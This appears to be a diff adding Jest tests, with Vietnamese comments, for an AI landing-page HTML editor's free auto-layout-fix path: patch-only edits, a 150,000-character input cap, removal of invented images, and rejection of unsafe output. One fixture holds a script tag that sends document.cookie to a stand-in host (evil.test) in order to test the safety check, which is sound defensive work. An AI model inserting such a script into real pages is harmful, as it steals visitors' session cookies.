@@ -1644,6 +1644,82 @@ describe('aiLandingPageService.editHtml — sửa theo đoạn (bản vá)', () 
     expect(generateWithBudget).toHaveBeenCalledTimes(1);
   });
 
+  // B-3 (rà soát AI 03/10): lượt tự sửa hiển thị KHÔNG trừ credit → không được là đường AI đắt: luôn đi đường vá, trần đầu
+  // vào riêng 150.000, không dự phòng viết-lại-cả-trang, không sinh lại (ảnh bịa → gỡ, trượt chốt an toàn → báo lỗi).
+  describe('B-3 — lượt tự sửa hiển thị MIỄN PHÍ (autoLayoutFix)', () => {
+    const autoEdit = (over = {}) => edit({ autoLayoutFix: true, layoutFindingsCount: 1, ...over });
+    const badPatch = patchResponse([{ find: '<h1>Không có đoạn này</h1>', replace: 'x' }]);
+    const AUTO_FIX_CAP = 150000;
+
+    it('vá hỏng (not_found) → KHÔNG rơi xuống viết-lại-cả-trang: 1 lần gọi + 422 LANDING_PATCH_FAILED; lượt thường cùng ca vẫn dự phòng (2 lần)', async () => {
+      generateWithBudget.mockResolvedValue(badPatch);
+      await expect(autoEdit()).rejects.toMatchObject({ status: 422, code: 'LANDING_PATCH_FAILED' });
+      expect(generateWithBudget).toHaveBeenCalledTimes(1);
+      expect(promptOf(0)).not.toContain('"html" là TOÀN BỘ');
+
+      generateWithBudget.mockReset();
+      generateWithBudget.mockResolvedValueOnce(badPatch).mockResolvedValueOnce(fullResponse(patchedHtml));
+      await edit();
+      expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    });
+
+    it('công tắc AI_LANDING_EDIT_MODE=full + autoLayoutFix → VẪN đi đường vá (prompt vá, 1 lần gọi, strategy=patch)', async () => {
+      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
+      const result = await withEditMode('full', () => autoEdit());
+      expect(generateWithBudget).toHaveBeenCalledTimes(1);
+      expect(promptOf(0)).toContain('"edits"');
+      expect(promptOf(0)).not.toContain('"html" là TOÀN BỘ');
+      expect(result.html).toBe(patchedHtml);
+      expect(doneLogOf(logSpy)).toContain('strategy=patch ');
+      expect(generateWithBudget.mock.calls[0][1].metadata).toEqual({ actorUserId: 1, mode: 'edit', strategy: 'patch', autoLayoutFix: true });
+    });
+
+    it('trần đầu vào riêng 150.000: đúng 150.000 qua; 150.001 → 400, KHÔNG gọi model; lượt thường 150.001 vẫn qua', async () => {
+      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
+      await expect(autoEdit({ currentHtml: htmlOfLength(AUTO_FIX_CAP) })).resolves.toMatchObject({ title: 'T' });
+      expect(generateWithBudget).toHaveBeenCalledTimes(1);
+
+      generateWithBudget.mockClear();
+      await expect(autoEdit({ currentHtml: htmlOfLength(AUTO_FIX_CAP + 1) })).rejects.toMatchObject({
+        status: 400,
+        message: expect.stringContaining('150.000'),
+      });
+      expect(generateWithBudget).not.toHaveBeenCalled();
+
+      await expect(edit({ currentHtml: htmlOfLength(AUTO_FIX_CAP + 1) })).resolves.toMatchObject({ title: 'T' });
+      expect(generateWithBudget).toHaveBeenCalledTimes(1);
+    });
+
+    it('vá chèn ảnh bịa → GỠ ảnh luôn, KHÔNG sinh lại (1 lần gọi, fakeImageRetry=0); lượt thường sinh lại (2 lần)', async () => {
+      const fakeUrl = 'https://fake.cdn.com/fake-auto.png';
+      const withFake = patchResponse([{ find: '<h1>Khoá học Alpha</h1>', replace: `<h1>Khoá học Alpha</h1><img src="${fakeUrl}">` }]);
+      generateWithBudget.mockResolvedValue(withFake);
+      const result = await autoEdit();
+      expect(generateWithBudget).toHaveBeenCalledTimes(1);
+      expect(result.strippedImageUrls).toEqual([fakeUrl]);
+      expect(result.html).not.toContain(fakeUrl);
+      expect(doneLogOf(logSpy)).toContain('fakeImageRetry=0');
+
+      generateWithBudget.mockReset();
+      generateWithBudget.mockResolvedValueOnce(withFake).mockResolvedValueOnce(patchResponse([goodEdit]));
+      await edit();
+      expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    });
+
+    it('vá trượt chốt an toàn → 422 LANDING_UNSAFE_OUTPUT sau ĐÚNG 1 lần gọi (không sinh lại); lượt thường sinh lại (2 lần)', async () => {
+      const steal = '<script>fetch("https://evil.test/c", { body: document.cookie })</script>';
+      const unsafe = patchResponse([{ find: '<h1>Khoá học Alpha</h1>', replace: `<h1>Khoá học Alpha</h1>${steal}` }]);
+      generateWithBudget.mockResolvedValue(unsafe);
+      await expect(autoEdit()).rejects.toMatchObject({ status: 422, code: 'LANDING_UNSAFE_OUTPUT' });
+      expect(generateWithBudget).toHaveBeenCalledTimes(1);
+
+      generateWithBudget.mockReset();
+      generateWithBudget.mockResolvedValueOnce(unsafe).mockResolvedValueOnce(patchResponse([goodEdit]));
+      await edit();
+      expect(generateWithBudget).toHaveBeenCalledTimes(2);
+    });
+  });
+
   describe('công tắc AI_LANDING_EDIT_MODE (đọc lúc gọi)', () => {
     it('full → 1 lần gọi prompt CŨ, metadata không có strategy, log strategy=full', async () => {
       generateWithBudget.mockResolvedValue(fullResponse(patchedHtml));
